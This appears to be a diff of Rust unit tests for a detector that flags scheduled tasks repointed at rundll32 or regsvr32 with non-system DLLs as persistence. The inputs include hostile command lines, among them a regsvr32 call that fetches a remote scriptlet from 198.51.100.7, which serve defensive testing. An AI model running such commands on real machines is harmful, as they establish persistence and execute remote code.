@@ -497,6 +497,47 @@ fn task_update_repointed_at_a_script_host_alerts() {
 }
 
 #[test]
+fn a_windows_task_rewritten_with_its_own_system_dll_stays_silent() {
+    // The lab capture (2026-11-28): the Program Compatibility Assistant updating its task.
+    let event = file_open_event_scheduled_task_update(
+        "PcaPatchDbTask",
+        r"%windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask",
+    );
+    assert!(check_scheduled_task_update_persistence(&event).is_none());
+}
+
+#[test]
+fn a_task_repointed_at_rundll32_with_a_dll_outside_the_system_directory_alerts() {
+    for action in [
+        r"rundll32.exe C:\ProgramData\x\payload.dll,Start",
+        r"%windir%\system32\rundll32.exe C:\Users\Public\p.dll,Run",
+        r"C:\Windows\System32\regsvr32.exe /s /u /i:http://198.51.100.7/a.sct scrobj.dll",
+        "rundll32.exe",
+        r"rundll32.exe payload.dll,Start",
+    ] {
+        let event = file_open_event_scheduled_task_update("Updater", action);
+        assert!(
+            check_scheduled_task_update_persistence(&event).is_some(),
+            "{action} must alert"
+        );
+    }
+}
+
+#[test]
+fn a_system_dll_does_not_excuse_a_second_loader_or_a_script_host() {
+    for action in [
+        r"rundll32.exe %windir%\system32\a.dll,X rundll32.exe C:\Temp\b.dll,Y",
+        r"cmd.exe /c rundll32.exe %windir%\system32\a.dll,X",
+    ] {
+        let event = file_open_event_scheduled_task_update("Updater", action);
+        assert!(
+            check_scheduled_task_update_persistence(&event).is_some(),
+            "{action} must alert"
+        );
+    }
+}
+
+#[test]
 fn task_update_pattern_match_is_case_insensitive() {
     let event = file_open_event_scheduled_task_update("Updater", r"C:\USERS\PUBLIC\Payload.EXE");
     assert!(check_scheduled_task_update_persistence(&event).is_some());
